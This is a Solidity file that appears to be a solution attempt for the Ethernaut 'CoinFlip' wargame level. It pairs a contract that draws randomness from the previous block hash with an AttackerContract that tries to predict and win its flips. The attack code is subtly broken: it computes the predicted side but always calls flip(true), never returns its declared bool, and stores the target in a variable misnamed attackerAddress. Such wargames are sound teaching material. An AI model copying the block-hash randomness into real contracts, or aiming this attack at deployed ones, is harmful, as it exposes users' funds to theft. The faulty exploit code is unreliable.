// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/aave/aave-token/blob/master/contracts/open-zeppelin/SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


import "https://github.com/aave/aave-token/blob/master/contracts/open-zeppelin/SafeMath.sol";
import "./ethernaut_lv_3.sol";


contract AttackerContract {

    using SafeMath for uint256;
    address attackerAddress = 0x48C45E3E0861e76B2755f8476C83118db21Db56a;
    CoinFlip public realContract = CoinFlip(attackerAddress);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 consec_wins;
    uint256 lastHash;

   function attack() public returns (bool){
       uint256 blockValue = uint256(blockhash(block.number-1));
       uint256 coinFlip = blockValue / FACTOR;
       bool side = coinFlip == 1 ? true : false;

       
       realContract.flip(true);
       

   }

}
